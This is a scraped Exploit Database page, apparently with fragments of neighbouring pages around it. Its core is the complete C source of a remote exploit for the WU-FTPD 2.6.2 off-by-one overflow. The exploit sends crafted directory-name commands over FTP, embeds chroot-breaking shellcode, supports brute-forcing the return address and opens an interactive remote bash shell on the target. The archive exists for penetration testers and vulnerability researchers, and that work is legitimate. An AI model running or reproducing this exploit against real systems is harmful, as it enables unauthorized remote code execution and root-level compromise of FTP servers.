iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 74
WU-FTPD 2.6.2 - Off-by-One Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWU-FTPD 2.6.2 - Off-by-One Remote Command ExecutionEDB-ID:74CVE:2003-0466EDB Verified:Author:Xpl017ElzType:remoteExploit:/Platform:LinuxDate:2003-08-03Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*****  wu-ftpd v2.6.2 off-by-one remote 0day exploit.****       exploit by "you dong-hun"(Xpl017Elz)****     Brute-Force function added.***/#define VERSION "v0.0.3"#include <stdio.h>#include <unistd.h>#include <stdlib.h>#include <netdb.h>#include <netinet/in.h>#include <sys/socket.h>#define DEBUG_NG#undef DEBUG_NG#define NRL 0#define SCS 1#define FAD (-1)#define MAX_BF (16)#define BF_LSZ (0x100) /* 256 */#define DEF_VA 255#define DEF_PORT 21#define DEF_ANSH 11#define GET_HOST_NM_ERR (NULL)#define SIN_ZR_SIZE 8#define DEF_ALIGN 4#define GET_R 5000#define DEF_NOP 64#define DEF_STR "x0x"#define HOME_DIR "/home/"#define DEF_HOST "localhost"#define DEF_COMM "echo \"x82 is happy, x82 is happy, x82 is happy\";" \"uname -a;id;export TERM=vt100;exec bash -i\n"/* ftpd handshake */#define FTP_CONN_SCS "220"#define FTP_USER_FAD "331"#define FTP_LOGIN_FAD "530 Login incorrect."#define FTP_LOGIN_SCS "230"#define CWD_COMM_SCS "250" /* also, RMD command */#define MKD_COMM_SCS "257"#define MKD_EXIST "521"void ftpd_login(int sock,char *user,char *pass);void conn_shell(int conn_sock);int setsock(char *u_host,int u_port);void re_connt(int st_sock_va);void prcode_usage(char *f_nm);int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character);int send_shellcode(int sock,int type,char *dir_nm);void make_send_exploit(int sock,int type,u_long sh_addr,int d_type);int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr);u_long null_chk(u_long sh_addr);void banrl();struct os{int num;char *v_nm;u_long sh_addr;};int t_g=(NRL);char home_dir[(DEF_VA)]; /* user home directory offset *//*** `0xff' uses two times to be realized in our shellcode.*/char shellcode_ffx2[]=/* setuid/chroot-break/execve shellcode by Lam3rZ */"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89""\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01""\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01""\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9""\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31""\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe""\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89""\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0""\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31""\x2e\x2e\x31\x31";struct os plat[]={/*** I enjoy version up, will not share more. :-}*/{0,"RedHat Linux 6.x Version wu-2.6.0(1) compile",0x0806a59c},{1,"RedHat Linux 6.x Version wu-2.6.1(1) compile",0x0806aad8},{2,"RedHat Linux 6.x Version wu-2.6.2(2) compile",0x0806aa60},{0x82,NULL,0x0},{0x8282,"Brute-Force mode",0x0806a082}};void prcode_usage(char *f_nm){int r_n=(NRL);fprintf(stdout," Usage: %s -options arguments\n\n",f_nm);fprintf(stdout," \t-h [hostname] : Target hostname & ip.\n");fprintf(stdout," \t-u [userid] : User id.\n");fprintf(stdout," \t-p [passwd] : User password.\n");fprintf(stdout," \t-n [port num] : Target port number.\n");fprintf(stdout," \t-s [shelladdr] : Shellcode address.\n");fprintf(stdout," \t-b : Brute-Force mode.\n");fprintf(stdout," \t-m [max num] : Brute-Force Count number.\n");fprintf(stdout," \t-i : help information.\n");fprintf(stdout," \t-t [target num] : Select target number.\n\n");for(r_n=(NRL);plat[r_n].v_nm!=(NULL);r_n++){fprintf(stdout," \t\t{%d} %s.\n",(plat[r_n].num),(plat[r_n].v_nm));}fprintf(stdout,"\n Example: %s -hlocalhost -ux82 -px82 -n21 -t0\n\n",f_nm);exit(FAD);}u_long null_chk(u_long sh_addr){if((sh_addr>>(NRL)&0xff)==(0x00)){return(sh_addr+=(SCS));}else return(sh_addr);}void ftpd_login(int sock,char *user,char *pass){char send_recv[(GET_R)];(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(!strstr(send_recv,(FTP_CONN_SCS))){fprintf(stdout," [-] ftpd connection failure.\n\n");close(sock);exit(FAD);}else fprintf(stdout," [*] ftpd connection success.\n");fprintf(stdout," [+] User id input.\n");memset((char *)send_recv,(NRL),sizeof(send_recv));snprintf(send_recv,sizeof(send_recv)-1,"USER %s\r\n",user);send(sock,send_recv,strlen(send_recv),(NRL));(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(!strstr(send_recv,(FTP_USER_FAD))){fprintf(stdout," [-] User id input failure.\n\n");close(sock);exit(FAD);}else fprintf(stdout," [+] User password input.\n");memset((char *)send_recv,(NRL),sizeof(send_recv));snprintf(send_recv,sizeof(send_recv)-1,"PASS %s\r\n",pass);send(sock,send_recv,strlen(send_recv),(NRL));(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(strstr(send_recv,(FTP_LOGIN_FAD))){fprintf(stdout," [-] FAILED LOGIN on %s.\n\n",user);close(sock);exit(FAD);}else if(strstr(send_recv,(FTP_LOGIN_SCS))){fprintf(stdout," [*] User %s logged in.\n",user);}else{fprintf(stdout," [-] ftpd handshake failure.\n\n");close(sock);exit(FAD);}return;}int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character){int dr_n=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)dir_nm,(NRL),(GET_R));/* MKD command */dir_nm[cmd_f++]=(0x4d);dir_nm[cmd_f++]=(0x4b);dir_nm[cmd_f++]=(0x44);dir_nm[cmd_f++]=(0x20);for(dr_n=(cmd_f);dr_n<(DEF_VA)+(cmd_f);dr_n++){dir_nm[dr_n]=(gb_character);}dir_nm[dr_n++]=(0x0d);dir_nm[dr_n++]=(0x0a);if(type){send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD command failed.\n\n");exit(FAD);}}/* CMD command */cmd_f=(NRL);dir_nm[cmd_f++]=(0x43);dir_nm[cmd_f++]=(0x57);dir_nm[cmd_f++]=(0x44);send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] CWD command failed.\n\n");exit(FAD);}return;}int send_shellcode(int sock,int type,char *dir_nm){int dr_n=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)dir_nm,(NRL),(GET_R));/* MKD command */dir_nm[cmd_f++]=(0x4d);dir_nm[cmd_f++]=(0x4b);dir_nm[cmd_f++]=(0x44);dir_nm[cmd_f++]=(0x20);for(dr_n=(cmd_f);dr_n<(DEF_VA)+sizeof(0xffffffff)+(cmd_f)-strlen(shellcode_ffx2);dr_n++){dir_nm[dr_n]=(DEF_NOP);}for(cmd_f=(NRL);cmd_f<strlen(shellcode_ffx2);cmd_f++){dir_nm[dr_n++]=shellcode_ffx2[cmd_f];}dir_nm[dr_n++]=(0x0d);dir_nm[dr_n++]=(0x0a);if(type){send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD shellcode_dir failed.\n\n");exit(FAD);}}/* CMD command */cmd_f=(NRL);dir_nm[cmd_f++]=(0x43);dir_nm[cmd_f++]=(0x57);dir_nm[cmd_f++]=(0x44);send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,(GET_R)-1,(NRL));if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] CWD shellcode_dir failed.\n\n");exit(FAD);}return;}void make_send_exploit(int sock,int type,u_long sh_addr,int d_type){char atk_bf[(GET_R)];{fprintf(stdout," [+] 01: make 0x41414141 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x41)); /* 01 */fprintf(stdout," [+] 02: make shell-code directory.\n");(int)send_shellcode(sock,d_type,(atk_bf)); /* 02 */fprintf(stdout," [+] 03: make 0x43434343 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x43)); /* 03 */fprintf(stdout," [+] 04: make 0x44444444 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x44)); /* 04 */fprintf(stdout," [+] 05: make 0x45454545 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x45)); /* 05 */fprintf(stdout," [+] 06: make 0x46464646 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x46)); /* 06 */fprintf(stdout," [+] 07: make 0x47474747 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x47)); /* 07 */fprintf(stdout," [+] 08: make 0x48484848 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x48)); /* 08 */fprintf(stdout," [+] 09: make 0x49494949 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x49)); /* 09 */fprintf(stdout," [+] 10: make 0x50505050 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x50)); /* 10 */fprintf(stdout," [+] 11: make 0x51515151 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x51)); /* 11 */fprintf(stdout," [+] 12: make 0x52525252 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x52)); /* 12 */fprintf(stdout," [+] 13: make 0x53535353 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x53)); /* 13 */fprintf(stdout," [+] 14: make 0x54545454 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x54)); /* 14 */fprintf(stdout," [+] 15: make 0x55555555 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x55)); /* 15 */(int)make_retloc(sock,type,(atk_bf),sh_addr); /* 16 */}return;}int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr){int r_rn_1=(NRL),r_rn_2=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)atk_bf,(NRL),(GET_R));if(type) /* MKD command */{atk_bf[cmd_f++]=(0x4d);atk_bf[cmd_f++]=(0x4b);atk_bf[cmd_f++]=(0x44);atk_bf[cmd_f++]=(0x20);}else /* RMD command */{atk_bf[cmd_f++]=(0x52);atk_bf[cmd_f++]=(0x4d);atk_bf[cmd_f++]=(0x44);atk_bf[cmd_f++]=(0x20);}for(r_rn_1=(cmd_f),r_rn_2=(NRL);r_rn_2<(DEF_VA)-strlen(home_dir)-(DEF_ANSH);r_rn_2++)atk_bf[r_rn_1++]=(0x41);{*(long *)&atk_bf[r_rn_1]=(sh_addr);r_rn_1+=(DEF_ALIGN);*(long *)&atk_bf[r_rn_1]=(sh_addr);r_rn_1+=(DEF_ALIGN);atk_bf[r_rn_1++]=(0x41);atk_bf[r_rn_1++]=(0x41);atk_bf[r_rn_1++]=(0x41);atk_bf[r_rn_1++]=(0x0d);atk_bf[r_rn_1++]=(0x0a);}send(sock,atk_bf,strlen(atk_bf),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(type) /* MKD command */{if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD &shellcode_dir failed.\n\n");exit(FAD);}else fprintf(stdout," [+] Ok, MKD &shellcode_dir.\n");}else /* RMD command */{if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] RMD &shellcode_dir failed.\n\n");exit(FAD);}else fprintf(stdout," [+] Ok, RMD &shellcode_dir.\n");}return;}int main(int argc,char *argv[]){int opt_g,sock,__bf=(NRL);int mx_bf=(MAX_BF),bf_lsz=(BF_LSZ);char user_id[(DEF_VA)]=(DEF_STR);char pass_wd[(DEF_VA)]=(DEF_STR);char tg_host[(DEF_VA)]=(DEF_HOST);int tg_port=(DEF_PORT);u_long sh_addr=(plat[t_g].sh_addr);(void)banrl();while((opt_g=getopt(argc,argv,"M:m:H:h:U:u:P:p:N:n:S:s:T:t:BbIi"))!=EOF){extern char *optarg;switch(opt_g){case 'M':case 'm':mx_bf=(atoi(optarg));bf_lsz=((0x1000)/mx_bf);break;case 'H':case 'h':memset((char *)tg_host,(NRL),sizeof(tg_host));strncpy(tg_host,optarg,sizeof(tg_host)-1);break;case 'U':case 'u':memset((char *)user_id,(NRL),sizeof(user_id));strncpy(user_id,optarg,sizeof(user_id)-1);break;case 'P':case 'p':memset((char *)pass_wd,(NRL),sizeof(pass_wd));strncpy(pass_wd,optarg,sizeof(pass_wd)-1);break;case 'N':case 'n':tg_port=(atoi(optarg));break;case 'S':case 's':sh_addr=strtoul(optarg,(NRL),(NRL));break;case 'T':case 't':if((t_g=(atoi(optarg)))<(3))sh_addr=(plat[t_g].sh_addr);else (void)prcode_usage(argv[(NRL)]);break;case 'B':case 'b':__bf=(SCS);break;case 'I':case 'i':(void)prcode_usage(argv[(NRL)]);break;case '?':(void)prcode_usage(argv[(NRL)]);break;}}if(!strcmp(user_id,(DEF_STR))||!strcmp(pass_wd,(DEF_STR)))(void)prcode_usage(argv[(NRL)]);memset((char *)home_dir,(NRL),sizeof(home_dir));snprintf(home_dir,sizeof(home_dir)-1,"%s%s",(HOME_DIR),user_id);if(!__bf){fprintf(stdout," [*] Target: %s.\n",(plat[t_g].v_nm));fprintf(stdout," [+] address: %p.\n",sh_addr);fprintf(stdout," [*] #1 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [ OK ]\n");fprintf(stdout," [1] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [2] send exploit code.\n");(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));close(sock);fprintf(stdout," [+] #2 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [ OK ]\n");fprintf(stdout," [3] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [4] send exploit code.\n");(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));fprintf(stdout," [5] Waiting, execute the shell ");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".\n");(void)conn_shell(sock);close(sock);}else{int bt_num=(NRL);t_g=(4);sh_addr=(plat[t_g].sh_addr);fprintf(stdout," [*] Brute-Force mode.\n");fprintf(stdout," [+] BF Count: %d.\n",mx_bf);fprintf(stdout," [+] BF Size: +%d.\n\n",bf_lsz);for(bt_num=(NRL);bt_num<(mx_bf);bt_num++){sh_addr=(u_long)null_chk(sh_addr);fprintf(stdout," [+] Brute-Force address: %p.\n",sh_addr);fprintf(stdout," [*] #1 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [ OK ]\n");fprintf(stdout," [1] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [2] send exploit code.\n");if(bt_num==(NRL)){(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));}else{(void)make_send_exploit(sock,(SCS),sh_addr,(NRL));}close(sock);fprintf(stdout," [+] #2 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [ OK ]\n");fprintf(stdout," [3] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [4] send exploit code.\n");(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));fprintf(stdout," [5] Waiting, execute the shell ");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".\n");(void)conn_shell(sock);close(sock);sh_addr+=(bf_lsz);}}exit(NRL);}int setsock(char *u_host,int u_port){int sock;struct hostent *sxp;struct sockaddr_in sxp_addr;if((sxp=gethostbyname(u_host))==(GET_HOST_NM_ERR)){return(FAD);}if((sock=socket(AF_INET,SOCK_STREAM,(NRL)))==(FAD)){return(FAD);}sxp_addr.sin_family=AF_INET;sxp_addr.sin_port=htons(u_port);sxp_addr.sin_addr=*((struct in_addr*)sxp->h_addr);bzero(&(sxp_addr.sin_zero),(SIN_ZR_SIZE));if(connect(sock,(struct sockaddr *)&sxp_addr,sizeof(struct sockaddr))==(FAD)){return(FAD);}return(sock);}void conn_shell(int conn_sock){int died;int ex_t=(NRL);char *command=(DEF_COMM);char readbuf[(GET_R)];fd_set rset;memset((char *)readbuf,(NRL),sizeof(readbuf));fprintf(stdout," [*] Send, command packet !\n\n");send(conn_sock,command,strlen(command),(NRL));for(;;){fflush(stdout);FD_ZERO(&rset);FD_SET(conn_sock,&rset);FD_SET(STDIN_FILENO,&rset);select(conn_sock+1,&rset,NULL,NULL,NULL);if(FD_ISSET(conn_sock,&rset)){died=read(conn_sock,readbuf,sizeof(readbuf)-1);if(died<=(NRL)){if(!ex_t)return;elseexit(NRL);}readbuf[died]=(NRL);fprintf(stdout,"%s",readbuf);}if(FD_ISSET(STDIN_FILENO,&rset)){died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);if(died>(NRL)){readbuf[died]=(NRL);if(strstr(readbuf,"exit"))ex_t=(SCS);write(conn_sock,readbuf,died);}}}return;}void re_connt(int st_sock_va){if(st_sock_va==(FAD)){fprintf(stdout," [ Fail ]\n\n");exit(FAD);}}void banrl(){fprintf(stdout,"\n 0x82-WOOoou~Happy_new - wu-ftpd v2.6.2 off-by-one remote exploit.\n\n");}/* eoc */// milw0rm.com [2003-08-03]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 75
man-db 2.4.1 - 'open_cat_stream()' Local uid=man - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { 